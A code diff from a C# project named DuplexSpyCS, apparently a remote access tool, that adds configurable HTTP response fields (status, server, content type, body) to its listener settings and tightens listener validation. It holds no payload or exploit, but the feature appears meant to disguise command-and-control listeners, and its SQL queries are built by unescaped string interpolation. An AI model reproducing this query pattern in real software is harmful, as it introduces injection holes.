@@ -74,6 +74,11 @@ namespace DuplexSpyCS
                     "HttpMethod",
                     "HttpPath",
                     "HttpUA",
+
+                    "HttpStatus", //HTTP response status code.
+                    "HttpServer", //HTTP response server.
+                    "HttpContentType", //HTTP response content-type.
+                    "HttpBody", //Default HTTP response body.
                 }
             }
         };
@@ -519,7 +524,7 @@ namespace DuplexSpyCS
         {
             if (fnbListenerExists(szName))
             {
-                var ls = fndtGetAllListener();
+                var ls = fnlsGetAllListener();
                 foreach (var l in ls)
                 {
                     if (string.Equals(l.szName, szName))
@@ -535,7 +540,7 @@ namespace DuplexSpyCS
             }
         }
 
-        public List<stListenerConfig> fndtGetAllListener()
+        public List<stListenerConfig> fnlsGetAllListener()
         {
             List<stListenerConfig> lListener = new List<stListenerConfig>();
             string szQuery = $"SELECT * FROM \"Listener\";";
@@ -557,6 +562,11 @@ namespace DuplexSpyCS
                     httpMethod = (enHttpMethod)Enum.Parse(typeof(enHttpMethod), (string)dr["HttpMethod"]),
                     szHttpPath = (string)dr["HttpPath"],
                     szHttpUA = (string)dr["HttpUA"],
+
+                    szStatus = (string)dr["HttpStatus"],
+                    szServer = (string)dr["HttpServer"],
+                    szContentType = (string)dr["HttpContentType"],
+                    szBody = (string)dr["HttpBody"],
                 };
 
                 lListener.Add(config);
@@ -595,7 +605,12 @@ namespace DuplexSpyCS
                     Equals(stCheckConfig.httpMethod, config.httpMethod) &&
                     Equals(stCheckConfig.szHttpHost, config.szHttpHost) &&
                     Equals(stCheckConfig.szHttpPath, config.szHttpPath) &&
-                    Equals(stCheckConfig.szHttpUA, config.szHttpUA)
+                    Equals(stCheckConfig.szHttpUA, config.szHttpUA) &&
+                    
+                    Equals(stCheckConfig.szStatus, config.szStatus) &&
+                    Equals(stCheckConfig.szServer, config.szServer) &&
+                    Equals(stCheckConfig.szContentType, config.szContentType) &&
+                    Equals(stCheckConfig.szBody, config.szBody)
                 );
             }
             catch (Exception ex)
@@ -607,10 +622,16 @@ namespace DuplexSpyCS
 
         private bool fnbSaveListenerValidate(stListenerConfig config)
         {
-            var ls = fndtGetAllListener();
+            if (string.IsNullOrEmpty(config.szName))
+                throw new Exception("Listener name cannot be null or empty.");
+
+            if (config.nPort < 0)
+                throw new Exception("Listener port cannot be less than zero.");
+
+            var ls = fnlsGetAllListener();
             foreach (var l in ls)
             {
-                if (int.Equals(config.nPort, l.nPort))
+                if (int.Equals(config.nPort, l.nPort) && !string.Equals(config.szName, l.szName))
                 {
                     MessageBox.Show($"Port[{config.nPort}] is assigned for Listener[{l.szName}]", "fnbSaveListenerValidate()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return false;
@@ -642,7 +663,13 @@ namespace DuplexSpyCS
                         $"\"HttpHost\"=\"{config.szHttpHost}\"," +
                         $"\"HttpMethod\"=\"{Enum.GetName(config.httpMethod)}\"," +
                         $"\"HttpPath\"=\"{config.szHttpPath}\"," +
-                        $"\"HttpUA\"=\"{config.szHttpUA}\" " +
+                        $"\"HttpUA\"=\"{config.szHttpUA}\"," +
+
+                        $"\"HttpStatus\"=\"{config.szStatus}\"," +
+                        $"\"HttpServer\"=\"{config.szServer}\"," +
+                        $"\"HttpContentType\"=\"{config.szContentType}\"," +
+                        $"\"HttpBody\"=\"{config.szBody}\" " +
+                        
                         $"WHERE \"Name\"=\"{config.szName}\";";
                 }
                 else
@@ -661,7 +688,13 @@ namespace DuplexSpyCS
                         $"\"{config.szHttpHost}\"," +
                         $"\"{Enum.GetName(config.httpMethod)}\"," +
                         $"\"{config.szHttpPath}\"," +
-                        $"\"{config.szHttpUA}\"" +
+                        $"\"{config.szHttpUA}\"," +
+
+                        $"\"{config.szStatus}\"," +
+                        $"\"{config.szServer}\"," +
+                        $"\"{config.szContentType}\"," +
+                        $"\"{config.szBody}\"" +
+
                         $");";
                 }
 
